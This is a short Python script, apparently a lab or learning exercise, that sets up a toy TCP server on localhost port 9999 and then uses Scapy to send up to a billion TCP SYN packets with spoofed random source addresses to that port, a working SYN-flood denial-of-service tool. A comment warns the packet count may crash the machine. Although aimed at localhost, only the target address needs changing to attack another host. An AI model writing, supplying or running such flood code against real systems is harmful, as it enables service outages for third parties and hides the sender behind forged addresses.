import random
from scapy.all import send, RandIP 
from scapy.layers.inet import IP, TCP
import socket

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("localhost", 9999))
    s.listen()
    print(f"Server listening on localhost:9999")
    conn, addr = s.accept()
    print(f"Connected by {addr}")
    conn.sendall(b"Hello, Client!")
    conn.close()
    s.close()

#server()


target_ip = "localhost"  
target_port = 9999             
for i in range(1_000_000_000):   # this is danger because the number of packets is too large this may crash your system
    src_port = random.randint(1024, 65535)
    seq = random.randint(0, 4294967295)
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=seq)
    pkt = ip/tcp
    send(pkt, verbose=0)

print("Finished sending SYN flood packets.")


